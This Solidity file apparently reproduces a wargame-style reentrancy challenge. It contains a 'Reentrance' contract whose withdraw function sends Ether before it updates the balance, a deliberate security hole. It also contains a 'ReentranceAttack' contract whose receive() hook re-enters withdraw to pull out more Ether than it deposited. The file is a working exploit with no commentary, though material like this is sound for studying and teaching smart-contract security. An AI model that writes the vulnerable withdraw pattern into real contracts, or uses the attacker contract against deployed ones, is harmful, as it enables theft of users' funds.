

pragma solidity ^0.8.0;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        
        uint256 c = a / b;
        
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      require(result, "Failed to send Ether");
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttack {
    Reentrance _targetContract;
    address _targetAddress;
    bool exploited;
    uint public _amount;
    uint counter;
    
    event amountWithdrawn(uint amount);

    constructor(address targetContract, uint amount) payable {
        _targetContract = Reentrance(payable(targetContract));
        _amount = amount;
        exploited = false;
        counter = 0;
        _targetAddress = targetContract;
        _targetContract.donate{value: amount}(address(this));
    }
    
    function attack() public {
         emit amountWithdrawn(_amount);
        _targetContract.withdraw(_amount);
    }
    
    receive() external payable {
        if(counter < 2) {
            counter++;
            _targetContract.withdraw(_amount);
        }
        
           
        
    }
}
